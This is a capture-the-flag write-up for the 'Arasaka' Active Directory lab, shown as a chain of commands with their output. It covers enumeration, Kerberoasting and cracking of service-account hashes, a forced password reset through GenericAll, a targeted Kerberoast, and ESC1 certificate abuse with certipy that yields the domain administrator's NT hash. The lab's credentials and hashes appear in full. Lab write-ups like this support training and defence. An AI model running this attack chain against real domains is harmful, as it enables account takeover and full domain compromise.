---
cover: ../.gitbook/assets/bf6616ea-be5c-4437-917e-cb12f49062ca.jpeg
coverY: 0
coverHeight: 278
---

# Arasaka(AD)

## Initial Enumeration :&#x20;

* We were provided with the Initial set of credentials. as It is an Assumed breach scenario.

```
faraday:hacksmarter123
```

### NMAP :&#x20;

```
PORT      STATE SERVICE    REASON          VERSION
53/tcp    open  tcpwrapped syn-ack ttl 126
88/tcp    open  tcpwrapped syn-ack ttl 126
135/tcp   open  tcpwrapped syn-ack ttl 126
139/tcp   open  tcpwrapped syn-ack ttl 126
389/tcp   open  tcpwrapped syn-ack ttl 126
| ssl-cert: Subject: commonName=DC01.hacksmarter.local
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.hacksmarter.local
| Issuer: commonName=hacksmarter-DC01-CA/domainComponent=hacksmarter
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-09-21T15:35:32
| Not valid after:  2026-09-21T15:35:32
| MD5:   fae9:1340:b0a8:16fc:0420:5560:a2c9:6fed
| SHA-1: affe:d211:3720:65b4:1ee7:d8da:1a58:6825:5903:d150
|_ssl-date: TLS randomness does not represent time
445/tcp   open  tcpwrapped syn-ack ttl 126
464/tcp   open  tcpwrapped syn-ack ttl 126
593/tcp   open  tcpwrapped syn-ack ttl 126
49664/tcp open  tcpwrapped syn-ack ttl 126
49669/tcp open  tcpwrapped syn-ack ttl 126
```

#### SMB(135,139,445) :&#x20;

* Since we were provided with the initial set of credentials, we list the shares to see if there's any interesting permission over a share

```
──(kali㉿kali)-[~/Desktop/HackSmarter/Arasaka]
└─$ nxc smb hacksmarter.local -u faraday -p hacksmarter123 --shares                                
SMB         10.1.122.201    445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:hacksmarter.local) (signing:True) (SMBv1:False) 
SMB         10.1.122.201    445    DC01             [+] hacksmarter.local\faraday:hacksmarter123 
SMB         10.1.122.201    445    DC01             [*] Enumerated shares
SMB         10.1.122.201    445    DC01             Share           Permissions     Remark
SMB         10.1.122.201    445    DC01             -----           -----------     ------
SMB         10.1.122.201    445    DC01             ADMIN$                          Remote Admin
SMB         10.1.122.201    445    DC01             C$                              Default share
SMB         10.1.122.201    445    DC01             IPC$            READ            Remote IPC
SMB         10.1.122.201    445    DC01             NETLOGON        READ            Logon server share 
SMB         10.1.122.201    445    DC01             SYSVOL          READ            Logon server share 
```

* Nothing seems interesting here as we do not have any permissions to write to any share or any out-of-the-ordinary.

## Bloodhound :&#x20;

### Collecting the Loot :&#x20;

* Since we had creds, we collected the bloodhound loot using `nxc`

```
┌──(kali㉿kali)-[~/Desktop/HackSmarter/Arasaka]
└─$ nxc ldap 10.1.122.201 -u faraday -p hacksmarter123 --bloodhound --collection all --dns-server 10.1.122.201
LDAP        10.1.122.201    389    DC01             [*] Windows Server 2022 Build 20348 (name:DC01) (domain:hacksmarter.local)
LDAP        10.1.122.201    389    DC01             [+] hacksmarter.local\faraday:hacksmarter123 
LDAP        10.1.122.201    389    DC01             Resolved collection methods: acl, rdp, psremote, container, group, dcom, localadmin, trusts, objectprops, session
LDAP        10.1.122.201    389    DC01             Done in 01M 17S
LDAP        10.1.122.201    389    DC01             Compressing output into /home/kali/.nxc/logs/DC01_10.1.122.201_2026-02-10_104851_bloodhound.zip
```

* Now we ingest it in Bloodhound and analyze them.

### Bloodhound Analysis :&#x20;

* We saw that this user had no Outbound Object Control and neither part of any Interesting Groups.

<figure><img src="../.gitbook/assets/image (78).png" alt=""><figcaption></figcaption></figure>

* Now we use the `Pre-Built` Cypher Queries and Check for Kerberoastable Users.

<figure><img src="../.gitbook/assets/image (79).png" alt=""><figcaption></figcaption></figure>

* Upon analyzing we see that the user `ALT.SVC` is Kerberoastable.

```
┌──(kali㉿kali)-[~/Desktop/HackSmarter/Arasaka]
└─$ nxc ldap 10.1.122.201 -u faraday -p hacksmarter123 --kerberoast output.txt                                          
LDAP        10.1.122.201    389    DC01             [*] Windows Server 2022 Build 20348 (name:DC01) (domain:hacksmarter.local)
LDAP        10.1.122.201    389    DC01             [+] hacksmarter.local\faraday:hacksmarter123 
LDAP        10.1.122.201    389    DC01             [*] Skipping disabled account: krbtgt
LDAP        10.1.122.201    389    DC01             [*] Total of records returned 1
LDAP        10.1.122.201    389    DC01             [*] sAMAccountName: alt.svc, memberOf: [], pwdLastSet: 2025-09-21 11:07:42.894050, lastLogon: <never>
LDAP        10.1.122.201    389    DC01             $krb5tgs$23$*alt.svc$HACKSMARTER.LOCAL$hacksmarter.local\alt.svc*$7565e907d09be3a55bc207a30b7da6fe$469210a27fd0a6d2c77773198cdb13eadff0a7fb0206180d4336361fd8ca5c8503ed62b09c2778c89504d029c127766dfbb27eaaddd10a873741440431c0b3a083c8e01529fe24c0c21f0bd7f4ecc2e68d294a70e151ae5e08f5b23206ac333a11e201c1ee3d35586bce7917e568b12433b818cb74f37e729fd8d37930aaec2b3eea49b9b7ea7adbb4ba6295451e92189f079e1c80e3f5f38ee1aeecc3bc0b6e6df5b34ae4cab6fff669bf3520985090b3ad6b2b1cf629870c06bdc7215b0796ad70222034e2611578e9e988fa1194ea92a7192e12f3f3c8f528555552c397eb46a08072773f332875b19d416e3f94391c3cdef97069760f5d7734ca9616b00cbc41af387b6eb2daeb1fef41f10a44be04f6ca1dbff09ff5247e8b98d9e5bf30d000fa3c5100b08cf47cea49291f55a949c22532d4e95b11de0fe683b4ed9cf553bedd895e158d69c783055402e842264ac69e54e46315bf84b0fdb5849805fe0ad7987886784b0b3e32438e2ab4656d51a228a3d7a2f4a35ff7c2369e9e549fc3a2bd3b36a83862cbf4daf995282cf1f23488120290c4dae4447b13074f05ea2e53e74f5486d32f1c49fe2c89e1399e74f1789ca37d108054fc22ad80e844037171c787dba5ae11710c9e20320310a7808ec85845e131d47a2b30a3afd8f9c391113ce1b765abb30930051d699d32f66d2c76ed7b8326f174634e6a2084830298c77da2baaf1dee5166afc3be6f157293883fbc8978544954be460c34e3bb7d01bd3d47a73d7be27cdf40f104e84e7490ac4b42c03dda8fba486a5370c78c186575cc74f2705696785be37b1f7b2c2f2cf0bfaae2a3ad7bf047e0e8d945249ed77ce2f68af3c46ceaf9dbba3e219324680421780481c4172981316f09466134feac0e25ad076a7fb280bae9538dcd6ba4c1a6efbf5ba625f55e66013d1a7f1ad1ae2bda10848859163b639c80477332861d584741865e490f6d93b2e0818f4528cb5b753f7f3813b68d42f26b3a81300a2a4acf214078db5753613047f32d57641466b56761cb30054121270e8191d766ca8c217175c67da9bc6a93d96538ed369df142378f5fef136d07f10438e0a348423d259c73519bff2c607bce3cf64ec6df83d582a633af5887bf4b45bb5ea8db00531d75be9171e493424f47a1505c5c91daf3fcd881ef76bebfc035cf5c0bebf3fc8cdd5065b63bc12c8ae8c4ac6e434de517dfda5a607acf65c67b381e1dfb11ec992c8eae776578f4f8960c9bfdc451f496f6eb14978122d5b974ff08625b050b95d6367736a39719f25099a744ae48cc8ab36d983c12defaaca6a66aeadbe079b66c5d2de44f4141deac8e778c2e21c78b36dd2ef7d744cd51b9f53d67f446c78e978eb3d15987af5f8d15061c35f4c3255a98a2604c843bf1fe95b10649af5d0786bd918ea43c5d7f92c1c681613f09ca710c0f72bfccbbb1a3606b3b7f1a314a503e812f379889be3da8bcc596095f34afeb4c7c2ab6f90819cd8006d540c92b45b58ff294
```

* Now we crack the retrieved hash using the `john` tool.

```
┌──(kali㉿kali)-[~/Desktop/HackSmarter/Arasaka]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt output.txt
Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
babygirl1        (?)     
1g 0:00:00:00 DONE (2026-02-10 11:20) 50.00g/s 51200p/s 51200c/s 51200C/s 123456..bethany
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

* we see that we gained the user creds for the `ALT.SVC` user
* Next we saw the permissions that this user had using bloodhound

<figure><img src="../.gitbook/assets/image (80).png" alt=""><figcaption></figcaption></figure>

* We see that this user has `GenericAll` permission over the user `YORINOBU` and now we’ll exploit it .
* We Reset the Password for this user.

```
┌──(kali㉿kali)-[~/Desktop/HackSmarter/Arasaka/targetedKerberoast]
└─$ net rpc password "yorinobu" "newP@ssword2022" -U "hacksmarter.local"/"alt.svc"%'babygirl1' -S "dc01.hacksmarter.local"
```

* Now we checked the Permissions that this user `yorninobu` had.

<figure><img src="../.gitbook/assets/image (81).png" alt=""><figcaption></figcaption></figure>

* We see that this user has `GenericWrite` permissions over the user `soulkiller.svc` .

## Access as `soulkiller.svc` :&#x20;

* We will now perform a targeted kerberoast over this user using the python script `targetedkerberoast.py`

{% embed url="https://github.com/ShutdownRepo/targetedKerberoast" %}

```
┌──(.venv)─(kali㉿kali)-[~/Desktop/HackSmarter/Arasaka/targetedKerberoast]
└─$ python3 targetedKerberoast.py -v -d 'hacksmarter.local' -u 'yorinobu' -p 'newP@ssword2022'
[*] Starting kerberoast attacks
[*] Fetching usernames from Active Directory with LDAP
[+] Printing hash for (alt.svc)
$krb5tgs$23$*alt.svc$HACKSMARTER.LOCAL$hacksmarter.local/alt.svc*$cd5e1fa5f997b15dbe7dc9e4847ecf74$67c6cacd9388b9b40f7be5343cd6ec399360d62dcb2f9a1865a7e5cc9f5f0107f70a1b362ea84db2faff3cb0b64d07a71ff49db89c6618768ba8a206b3a8e352ac0ae70d926cccf163cd4be4de7e1ec2e29427064296ed3c521c091c0786e55b40b6e1a4bf8b1dfee5e3857e628f38fe6bb71fdac907b06796814a3a6fc763bff9b97552b426d0cd48226539e5d8aa00a63a2a76f4646940acd68e4a5a5bb538c885e2ff1a192978f4575101d84c074496c88b036843125564b73153eb0b4092e8679178aa9ec20930261201fdf234c4a72133f7da1c4189e883df2571794fe09b007f181dbf9f9fa150b0da641e20b487c215edd5674485ef7406477f5c44db2917fc587db9d6f09c0bc5ff75054f0f8f12ccc0f95b38ec1f0d6366728571be6da3137d0edb11014d32a697bddec18f8636630c04ad7cf5ff34cc3538c3dc8c09e566fa5aab04d72475cb837f4abb84f8672d2692ee32c7bf75e074ef10dbf0bf93ae0252a2b9197240c39e6889a34e8c4575dbe99eb4eca3a40109a4e287509ac0e2666639b70c5ff11a370640b0fbd29e1962b6ca4d1eaf641ce333ba0bb9c17bbb7e457e0664f81ddde21e07eed8f954ceb2e5fe6c03d60b6d97612a4b7f0f44d85a341568eed37d78448b9ca613cfe4cd045b3ed6967c2d33b685fac322104998d74d2d30da38cf212468f181efc289931e7b0cd073a43d8346d025ec978f0c5670ba4f54ec86e5d57df3d1d14c28a77692878e9fd6615d15ed7bb1d4e35e967f3e9368a65da7b5e2ed858abfc7392751d50eee55b867eff562b903387ebf20b9f3308ab6402492235879b4d66f734971ae283388b461f3bf61c20f33e8c3699618f748f7b5b3825473fcd68dbeb28394a96ad8473565fa7499f7803b09781421afdfaeeef69a0d92fce2d3797dc1fbf4ab866ee8861d54f14f877b6b4489867b81a21cda7caeac8b699d923e0722b8e4e24ad5862ebe9054375ad4f23047aa2e2e27c5a75261abb0d1a124ca83fe48b1e46c835e298665c6495182399786842a3e27bc4c7ffdc35a82e257ca25ecedb19346b0abaa371508645debd0ab2fcd1cb2dcc4a9242bde6a57d77861c3605b561ff23024ebdea9b2a73a1420970dc1475cc0dcc725123b5046d04574b8c38218df238d1de3120e05bef011c51b2eba71ed212ee40ce8123804c0dc1a9233b19d7ed4eeeb37b8a9502d92ae13253c03c467e0489d1835d31d4dc94ba7c472db4a70cca11989cc2c8e663754e1e3336259eb385da10436e7a7bad84b65c231b169d80592f0ec043461268951d64a3cf46975662377a2a3b543603f7b9a23d8123f03b37f0d51c350137264e640a5b2495bee0b5105756a2962fb6da3ab7473ee91e54fea8a102a15f37c6739bd94c0eaa021fb0be6e7c3de6b65f95ab501f77dab207d0d2fe8f9c0f5cce54a8a5b5bf9bf1de9a02156562b23584c041eecc06e7198de6e4d423f636a58595c2c67dcfbc294de748f3c4ae57b4b101319ca10ceb0c37b0061c70cf9b00aa2112fcdc070cbe7aff9ebc262bd3e909c9fbb2f9d4a
[VERBOSE] SPN added successfully for (Soulkiller.svc)
[+] Printing hash for (Soulkiller.svc)
$krb5tgs$23$*Soulkiller.svc$HACKSMARTER.LOCAL$hacksmarter.local/Soulkiller.svc*$eba3cc749d8c0004f721c506c8eeb867$5984fda69ea4d7031d3fed3dddf1c9b5a531789ac0ed9ee92025215dbd913070feb3bcc758f8b916ecb857858fee6c8c522c9c65f88e20264863dbe0a2ae2d4b7865116ede35be70a1654cf638a5b481e974bf0c562fb8aee06f60831f3af1fbe49448f697961a112698c916c8c985afcc4f41e7fb351bfdf621536ff5a15ab049011f5f99ba289afec185ba6c68ca6bc301eda52152773ae776d7bb4505b53ae59cc69fdd2eb1d26b4adc71059e03fe0d020e98242c9ab84c63ab5e2940556cc9066d6906173490f37baf4ebf253804e90ab13ab08cc5c275b366c8bf2fd52d2c0771733fc0d8d457b8231bc87f5123e393a8b45925b22f702d19fe2e25b5c0584f911ba596fdd0e35e202af2f88ac991e5816930ef36afbe20a035db56443b61e4d58c279a66538f65660887620876dcb244f81f1160ecb63413c1221f274f257b5ecc1ba67f160182f25f384d34774024d2c999b953d71af65d469a34f96df20c586f2b92ecff37706cc48f3bb0f92a615e2cd914aaf6befc37280728f2d89d8ee0965611eadb592a0ef62e40783ea1dac1161c5cc45db24f1415efbceedecf77a068f9676140c42ba5ebbc10f7d0355e077a55a0b79a8c06c29f97aab3d0d310c662193dc062953137c1dc8887c407622e85a4adcb2fbbf1cc9e216189145a79380d959a31bdbffc8811c685f20a140f3fc709cfd673b61514bc4ea023dc8f3d7c67fdb6590cc7c7206431266c95fcc42f51015c2513918d7c1809713692b69db9e6444715c125da46f7c3db955eb8c477073752bcc14e25bcf27670d44b1cc9cb83e0acc1e90317547f2e4fa44ccbb4dd8e91fb174e8a3409fef89f76fce90b3ebecceac80f1fde88de11cc2755031bbb37e932e4c8d49934ea59bad626e38c8ab1d9fa8d9912f241bcccda6f5b886caeedb43b63287a0309b4c29b462aa3c5190b6d000b377e2d8cbe4a0e9ade385009981685a310a534028f9c9a8fe3f41564d8bcb407d07680c2849e3d95b71e42ae1c39492bacaa870d20c8e768721f40137fef06054f6c6ee602233c80bd33abc26d1af7924aa0b0de95c03d9c3493ffeee9d7b182a0584461f49f5bc42a57d0538ba7f8f6e708004d24df8d52a2fa11e67f8da050da9394ae0eaad8079a2e3433e15de80c3869f87256ad8a33124a60fdd460048534ce663aa041742b31c934e6fed18fbf837c852ed616bd3f61ae5c5d2d05ea062a0367eded93ed6988c555a634b334c56bc80bafe8197bdf28b93cddf76967021dcb5e857ab66e489d308e2011c838ed3fc8c8e8040ca917b8610327ae05ac915930b0eeff25af6149052b59e9f8fc1536eb70cb12eb6ef98336f68642a6bb81d84f247461f3d6f6708cc5dacb508a2145c3ea628c04d027a4cb3c48dc88cc11a11221ce6d8fd7e1d7a0be561dd261a2221a672c7e7b41d76d0f1092bb288252a8b13fdd772f8ab30aeec5ff64c8e6e3c50d1166b498a721db0d62d389db0b4c0e6d40118231cd97a43e03a93cad0c1492ead6b6be168cbee5c05e7cd42ef618802ebcf93b8ea862225d1d
[VERBOSE] SPN removed successfully for (Soulkiller.svc)
```

* Now we can put the hash in a file named `hash.txt` and crack it using `john`.

```
┌──(kali㉿kali)-[~/Desktop/HackSmarter/Arasaka/targetedKerberoast]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash1.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
MYpassword123#   (?)     
1g 0:00:00:10 DONE (2026-02-10 11:43) 0.09950g/s 1079Kp/s 1079Kc/s 1079KC/s MZCARMAL..MYROOM2518
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 

```

* Now we can see that we have successfully cracked the password and compromised another user in the domain.
* Upon analysing the bloodhound data we see that the user `soulkiller.svc` has no outbound object control so we enumerate the shares and let’s check the permissions he has.

```
┌──(kali㉿kali)-[~/Desktop/HackSmarter/Arasaka/targetedKerberoast]
└─$ nxc smb hacksmarter.local -u soulkiller.svc -p 'MYpassword123#' --shares  
SMB         10.1.122.201    445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:hacksmarter.local) (signing:True) (SMBv1:False) 
SMB         10.1.122.201    445    DC01             [+] hacksmarter.local\soulkiller.svc:MYpassword123# 
SMB         10.1.122.201    445    DC01             [*] Enumerated shares
SMB         10.1.122.201    445    DC01             Share           Permissions     Remark
SMB         10.1.122.201    445    DC01             -----           -----------     ------
SMB         10.1.122.201    445    DC01             ADMIN$                          Remote Admin
SMB         10.1.122.201    445    DC01             C$                              Default share
SMB         10.1.122.201    445    DC01             IPC$            READ            Remote IPC
SMB         10.1.122.201    445    DC01             NETLOGON        READ            Logon server share 
SMB         10.1.122.201    445    DC01             SYSVOL          READ            Logon server share 
```

* Upon seeing this we don’t get a lead so we check with the users flag  in `nxc` now to check who are the users in the Domain.

```
┌──(kali㉿kali)-[~/Desktop/HackSmarter/Arasaka/targetedKerberoast]
└─$ nxc smb hacksmarter.local -u soulkiller.svc -p 'MYpassword123#' --users    
SMB         10.1.122.201    445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:hacksmarter.local) (signing:True) (SMBv1:False) 
SMB         10.1.122.201    445    DC01             [+] hacksmarter.local\soulkiller.svc:MYpassword123# 
SMB         10.1.122.201    445    DC01             -Username-                    -Last PW Set-       -BadPW- -Description-                                               
SMB         10.1.122.201    445    DC01             Administrator                 2026-02-08 14:04:00 0       Built-in account for administering the computer/domain 
SMB         10.1.122.201    445    DC01             Guest                         <never>             0       Built-in account for guest access to the computer/domain 
SMB         10.1.122.201    445    DC01             krbtgt                        2025-09-21 02:51:44 0       Key Distribution Center Service Account 
SMB         10.1.122.201    445    DC01             Goro                          2025-09-21 15:00:31 0       Loyal to a fault 
SMB         10.1.122.201    445    DC01             alt.svc                       2025-09-21 15:07:42 0       Trapped for eternity 
SMB         10.1.122.201    445    DC01             Yorinobu                      2026-02-10 16:36:25 0        
SMB         10.1.122.201    445    DC01             Hanako                        2025-09-21 14:59:03 0       Waiting at embers 
SMB         10.1.122.201    445    DC01             Faraday                       2025-09-21 15:06:45 0        
SMB         10.1.122.201    445    DC01             Smasher                       2025-09-21 15:01:20 0        
SMB         10.1.122.201    445    DC01             Soulkiller.svc                2025-09-21 15:30:13 0       Certificate managment for soulkiller AI 
SMB         10.1.122.201    445    DC01             Hellman                       2025-09-21 15:04:19 0        
SMB         10.1.122.201    445    DC01             kei.svc                       2025-09-21 15:05:16 0       Trapped for eternity 
SMB         10.1.122.201    445    DC01             Silverhand.svc                2025-09-21 15:03:10 0       Trapped for eternity 
SMB         10.1.122.201    445    DC01             Oda                           2025-09-21 15:02:14 0        
SMB         10.1.122.201    445    DC01             the_emperor                   2025-11-06 17:19:03 0        
SMB         10.1.122.201    445    DC01             [*] Enumerated 15 local users: HACKSMARTER

```

* Upon seeing this we get a lead as in the description of this user we can see that this is Certificate management for AI. So we can check for Vulnerable Certificate templates using the tool `certipy-ad` .

## Shell as `Administrator` :&#x20;

* Now we use the popular tool `certipy-ad` for Interacting with the ADCS.

```
┌──(kali㉿kali)-[~/Desktop/HackSmarter/Arasaka]
└─$ certipy-ad find -u 'soulkiller.svc@hacksmarter.local' -p 'MYpassword123#' -dc-ip 10.1.122.201 -enabled -vuln -ldap-scheme ldap -stdout
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 34 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 12 enabled certificate templates
[*] Finding issuance policies
[*] Found 14 issuance policies
[*] Found 0 OIDs linked to templates
[*] Retrieving CA configuration for 'hacksmarter-DC01-CA' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Successfully retrieved CA configuration for 'hacksmarter-DC01-CA'
[*] Checking web enrollment for CA 'hacksmarter-DC01-CA' @ 'DC01.hacksmarter.local'
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : hacksmarter-DC01-CA
    DNS Name                            : DC01.hacksmarter.local
    Certificate Subject                 : CN=hacksmarter-DC01-CA, DC=hacksmarter, DC=local
    Certificate Serial Number           : 1DBC9F9ECF287FB04FDE66106578611F
    Certificate Validity Start          : 2025-09-21 15:32:14+00:00
    Certificate Validity End            : 2030-09-21 15:42:14+00:00
    Web Enrollment
      HTTP
        Enabled                         : False
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Permissions
      Owner                             : HACKSMARTER.LOCAL\Administrators
      Access Rights
        ManageCa                        : HACKSMARTER.LOCAL\Administrators
                                          HACKSMARTER.LOCAL\Domain Admins
                                          HACKSMARTER.LOCAL\Enterprise Admins
        ManageCertificates              : HACKSMARTER.LOCAL\Administrators
                                          HACKSMARTER.LOCAL\Domain Admins
                                          HACKSMARTER.LOCAL\Enterprise Admins
        Enroll                          : HACKSMARTER.LOCAL\Authenticated Users
Certificate Templates
  0
    Template Name                       : AI_Takeover
    Display Name                        : AI_Takeover
    Certificate Authorities             : hacksmarter-DC01-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Enrollment Flag                     : IncludeSymmetricAlgorithms
                                          PublishToDs
    Private Key Flag                    : ExportableKey
    Extended Key Usage                  : Client Authentication
                                          Secure Email
                                          Encrypting File System
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 2
    Validity Period                     : 1 year
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2025-09-21T16:16:36+00:00
    Template Last Modified              : 2025-09-21T16:16:36+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : HACKSMARTER.LOCAL\Soulkiller.svc
                                          HACKSMARTER.LOCAL\Domain Admins
                                          HACKSMARTER.LOCAL\Enterprise Admins
      Object Control Permissions
        Owner                           : HACKSMARTER.LOCAL\Administrator
        Full Control Principals         : HACKSMARTER.LOCAL\Domain Admins
                                          HACKSMARTER.LOCAL\Enterprise Admins
        Write Owner Principals          : HACKSMARTER.LOCAL\Domain Admins
                                          HACKSMARTER.LOCAL\Enterprise Admins
        Write Dacl Principals           : HACKSMARTER.LOCAL\Domain Admins
                                          HACKSMARTER.LOCAL\Enterprise Admins
        Write Property Enroll           : HACKSMARTER.LOCAL\Domain Admins
                                          HACKSMARTER.LOCAL\Enterprise Admins
    [+] User Enrollable Principals      : HACKSMARTER.LOCAL\Soulkiller.svc
    [!] Vulnerabilities
      ESC1                              : Enrollee supplies subject and template allows client authentication.
```

* We see that it is vulnerable to `ESC1` which escalates our privileges to Administrator and now we exploit it.

```
┌──(kali㉿kali)-[~/Desktop/HackSmarter/Arasaka]
└─$ certipy-ad account -u 'soulkiller.svc' -p 'MYpassword123#' -dc-ip '10.1.122.201' -user 'administrator' read                           
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Reading attributes for 'Administrator':
    cn                                  : Administrator
    distinguishedName                   : CN=Administrator,CN=Users,DC=hacksmarter,DC=local
    name                                : Administrator
    objectSid                           : S-1-5-21-3154413470-3340737026-2748725799-500
    sAMAccountName                      : Administrator
    userAccountControl                  : 512
    whenCreated                         : 2025-09-21T02:51:00+00:00
    whenChanged                         : 2026-02-08T14:04:00+00:00
```

* Now we request a Certificate for the Admininistrator.                                                                                                                                                                        &#x20;

```
┌──(kali㉿kali)-[~/Desktop/HackSmarter/Arasaka]
└─$ certipy-ad req \
    -u 'soulkiller.svc@hacksmarter.local' -p 'MYpassword123#' \
    -dc-ip '10.1.122.201' -target 'DC01.hacksmarter.local' \
    -ca 'hacksmarter-DC01-CA' -template 'AI_Takeover' \
    -upn 'administrator@hacksmarter.local' -sid 'S-1-5-21-3154413470-3340737026-2748725799-500'
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 4
[*] Successfully requested certificate
[*] Got certificate with UPN 'administrator@hacksmarter.local'
[*] Certificate object SID is 'S-1-5-21-3154413470-3340737026-2748725799-500'
[*] Saving certificate and private key to 'administrator.pfx'
[*] Wrote certificate and private key to 'administrator.pfx'

```

* Now we authenticate using this PFX format Certificate and retrieve the NTLM Hash for Administrator.

```
┌──(kali㉿kali)-[~/Desktop/HackSmarter/Arasaka]
└─$ certipy-ad auth -pfx administrator.pfx -dc-ip 10.1.122.201                                                 
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'administrator@hacksmarter.local'
[*]     SAN URL SID: 'S-1-5-21-3154413470-3340737026-2748725799-500'
[*]     Security Extension SID: 'S-1-5-21-3154413470-3340737026-2748725799-500'
[*] Using principal: 'administrator@hacksmarter.local'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'administrator.ccache'
[*] Wrote credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@hacksmarter.local': aad3b435b51404eeaad3b435b51404ee:a7aba3e5816116a9e73aa2e8cb8b93df
                                                                                                                        
```

* We got the administrator hash now and now we can authenticate through `evil-winrm` using the hashes as administrator and gain the root flag.

<figure><img src="../.gitbook/assets/image (82).png" alt=""><figcaption></figcaption></figure>

* Now we have owned the Domain as Administrator and submitted the root flag!!!
